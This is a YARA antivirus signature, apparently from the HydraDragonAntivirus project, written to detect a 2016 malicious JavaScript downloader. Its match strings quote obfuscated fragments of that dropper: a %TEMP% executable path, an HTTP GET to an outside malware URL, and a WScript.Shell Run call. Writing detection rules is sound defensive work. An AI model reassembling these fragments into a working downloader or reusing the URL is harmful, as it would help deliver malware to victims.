rule sig_20160328_793a34f687ee636eaa82c2fd0f19a0d5 {
  meta:
    description = "datamaliciousorder - file 20160328_793a34f687ee636eaa82c2fd0f19a0d5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6392da8d748697483e6ae2e7638990fb89167e58e046b0abed81d787de0fd5df"

  strings:
    $s1  = "function Bueqpufgp() {return Dqxdbc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"X7K78pMCIQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Rlptzgoeia](Fukwxsa() * 11)} while (Rwwjyjhsx[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Ppxpcdndi(Dzldkq, Mykuku){return Dzldkq - Mykuku;};" fullword ascii
    $s4  = "Rwwjyjhsx[Emqtlnx](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "var Dqxdbc = function Htagbr() {return WScript[Iooajugzui](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ombyunsiq() {return ((Vfqsyeg == true) && (Vfqsyeg == Ufioq)) ? 1 : Wlhjraheyp;};" fullword ascii
    $s7  = "function Fgmfcwo(Jamgtgxf){Dqxdbc[\"Run\"](Jamgtgxf, Wlhjraheyp, Wlhjraheyp);};" fullword ascii
    $s8  = "function Rffcwk(){return Iooajugzui;};" fullword ascii
    $s9  = "var Apdht = new this[\"Date\"]();" fullword ascii
    $s10 = "function Jtcri(Fenaj) {var Eswdfsr = (1, 2, 3, 4, 5, Fenaj); return Eswdfsr;};" fullword ascii
    $s11 = "function Fukwxsa(){return 22;};" fullword ascii
    $s12 = "var Ufioq = false;" fullword ascii
    $s13 = "return Ppxpcdndi(Bksolbhmso, Broqlvbcp);" fullword ascii
    $s14 = "var Rpwdfw = false;" fullword ascii
    $s15 = "Ufioq = true; " fullword ascii
    $s16 = "function Gecjs()" fullword ascii
    $s17 = "var Vfqsyeg = false;" fullword ascii
    $s18 = "function Nldbihlde(){return Dlzzqnhh;};" fullword ascii
    $s19 = "Vfqsyeg = true; " fullword ascii
    $s20 = " while (Ndziudw){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}